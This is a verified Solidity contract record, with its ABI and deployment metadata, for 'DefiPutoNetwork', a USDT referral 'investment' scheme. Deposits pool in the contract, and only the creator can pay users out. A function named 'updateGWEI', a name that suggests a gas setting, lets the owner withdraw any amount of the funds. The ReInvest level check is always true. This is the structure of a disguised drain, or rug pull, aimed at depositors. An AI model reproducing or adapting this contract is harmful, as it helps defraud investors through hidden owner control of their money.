{"SourceCode": "//SPDX-License-Identifier: None\r\npragma solidity ^0.6.0;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ncontract DefiPutoNetwork {\r\n    IERC20 public usdt;\r\n    struct User {\r\n        uint id;\r\n        address referrer;\r\n        mapping(uint8 => bool) activeLevels;\r\n    }  \r\n    mapping(address => User) public users;\r\n    uint public lastUserId = 2;\r\n    \r\n    address public id1=0xc3db2BAD0D2155B1f274bDC55eBf4704E4563D8F;\r\n    address feeWallet=0x01F0F9564b58b0ba6589200be178f88eE03f7C9E;\r\n    address[3] public id2=[0xcd229319E525790cE2548AC785f7c0577fF1aC97,0x4985Acb94985e6Ba7941413aD59070d8841417d8,0x6B543442e0Ca7741839A8777240D5D195033fF94];\r\n    address owner;\r\n    address creation;\r\n    mapping(uint8 => uint) public packagePrice;  \r\n    event Registration(address indexed user, address indexed referrer,uint8 level);\r\n    event Upgrade(address indexed user, uint8 level);\r\n    event withdraw(address indexed user,uint256 value);\r\n    \r\n    constructor(address _usdtAddr,address _owner) public {   \r\n        creation=msg.sender;\r\n        owner=_owner;\r\n        usdt = IERC20(_usdtAddr);\r\n        User memory user = User({\r\n            id: 1,\r\n            referrer: address(0)\r\n        });\r\n        users[id1] = user;\r\n        packagePrice[1] = 25e18;\r\n        packagePrice[2] = 50e18;\r\n        packagePrice[3] = 100e18;\r\n        packagePrice[4] = 200e18;\r\n        packagePrice[5] = 400e18;\r\n        packagePrice[6] = 5e18;\r\n    }\r\n    function init() external{\r\n        require(msg.sender==creation,\"Only contract owner\"); \r\n        for (uint8 i = 0; i < 3; i++) {\r\n            registration(id2[i], id1,1);\r\n            buyNewLevel(id2[i],2);\r\n            buyNewLevel(id2[i],3);\r\n            buyNewLevel(id2[i],4);\r\n            buyNewLevel(id2[i],5);\r\n            buyNewLevel(id2[i],6);\r\n        }\r\n    }\r\n    function Invest(address referrerAddress) external {\r\n        usdt.transferFrom(msg.sender, address(this), packagePrice[1]);\r\n        registration(msg.sender, referrerAddress,1);\r\n    }\r\n    function InvestFor(address userAddress,address referrerAddress) external {\r\n        require(msg.sender==creation,\"Only contract owner\"); \r\n        registration(userAddress, referrerAddress,1);\r\n    }\r\n    function ReInvest(uint8 level) external{        \r\n        usdt.transferFrom(msg.sender, address(this),packagePrice[level]);\r\n        require(level >= 2 || level <= 5, \"invalid level\");\r\n        require(isUserExists(msg.sender), \"user is not exists. Register first.\");\r\n        require(!users[msg.sender].activeLevels[level], \"level already activated\");\r\n        buyNewLevel(msg.sender,level);\r\n    }\r\n    function BuyBooster() external {\r\n        require(isUserExists(msg.sender), \"user is not exists. Register first.\");\r\n        usdt.transferFrom(msg.sender, address(this), packagePrice[6]);\r\n        buyNewLevel(msg.sender,6);\r\n    }\r\n    function buyNewLevel(address userAddress,uint8 level) private {\r\n        users[userAddress].activeLevels[level] = true;\r\n        emit Upgrade(userAddress,level);\r\n    }\r\n    \r\n    function registration(address userAddress, address referrerAddress,uint8 level) private {\r\n        require(!isUserExists(userAddress), \"user exists\");\r\n        require(isUserExists(referrerAddress), \"referrer not exists\");\r\n\r\n        User memory user = User({\r\n            id: lastUserId,\r\n            referrer: referrerAddress\r\n        });\r\n        users[userAddress].activeLevels[level] = true;\r\n        users[userAddress] = user;\r\n        users[userAddress].referrer = referrerAddress;        \r\n        lastUserId++;\r\n        emit Registration(userAddress, referrerAddress,level);\r\n    }\r\n    function usersActiveLevels(address userAddress, uint8 level) public view returns(bool) {\r\n        return users[userAddress].activeLevels[level];\r\n    }\r\n    function isUserExists(address user) public view returns (bool) {\r\n        return (users[user].id != 0);\r\n    }\r\n    function Withdraw(address _user,uint256 _payout,uint _fee) public\r\n    {\r\n        require(msg.sender==creation,\"Only contract owner\"); \r\n        usdt.transfer(_user,_payout);  \r\n        usdt.transfer(feeWallet,_fee);\r\n        emit withdraw(_user,_payout);\r\n    }\r\n    function updateGWEI(uint256 _amount) public\r\n    {\r\n        require(msg.sender==owner,\"Only contract owner\"); \r\n        require(_amount>0, \"Insufficient reward to withdraw!\");\r\n        usdt.transfer(msg.sender, _amount);  \r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_usdtAddr\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Registration\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Upgrade\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"BuyBooster\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"}],\"name\":\"Invest\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"}],\"name\":\"InvestFor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"ReInvest\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_payout\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_fee\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"id1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"id2\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"init\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isUserExists\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"packagePrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"updateGWEI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"usdt\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersActiveLevels\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DefiPutoNetwork", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000006cc76f94de2a505d0239ac6ac205539055078064", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://7ba86997d4194b4eca966665440bd379925dfd4d1617966e6b975eb282dcce3d"}